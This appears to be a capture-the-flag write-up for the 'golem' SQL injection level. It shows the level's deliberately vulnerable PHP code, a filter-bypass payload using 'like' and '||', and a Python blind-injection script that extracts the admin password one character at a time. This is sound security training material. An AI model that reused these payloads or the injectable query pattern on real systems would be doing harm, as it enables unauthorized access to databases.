```
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
  highlight_file(__FILE__); 
?>
```


BLACKLIST: =

PAYLOAD: ?pw='|| id like 'admin'-- -
OUTPUT: select id from prob_golem where id='guest' and pw=''||id like 'admin'-- -'



PAYLOAD: ?pw=88e3137f

```
from requests import get
url = "https://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php"
str1=''
cookie = dict(PHPSESSID="ovrqhe8n4c95a8ek52lg8hrs50")
#query1:?pw='||id like 'admin' %26%26 length(pw)>0
#?pw=%27||id%20like%20%27admin%27%20%26%26%20length(pw)%20like%208%23
#query2:?pw='||id like'admin' && ascii(mid(pw,1,1))>0#
#?pw=%27||id%20like%27admin%27%20%26%26%20ascii(mid(pw,1,1))>0%23
for k in range(1,10):
	valu="?pw=%27||id like 'admin' %26"+"%26 length(pw) like "+ str(k)+"%23"
	print valu
	new_url1 = url + valu
	r1 = get(new_url1, cookies=cookie)
	if r1.text.find("<h2>Hello admin</h2>") > 0:
			print k
			break

for j in range(1,k):
	for i in range(0,123):
		val = "?pw=%27||id like 'admin' %"+"26%26 ascii(mid(pw,"+str(j)+",1)) like "+str(i)+"%23"
		print val
		new_url = url + val
		
		r = get(new_url, cookies=cookie)

		if r.text.find("<h2>Hello admin</h2>") > 0:
			print i
			str1+=chr(i)
print str1
#?pw=88e3137f
```
OUTPUT:
Hello Admin
Golem clear

Golem clear
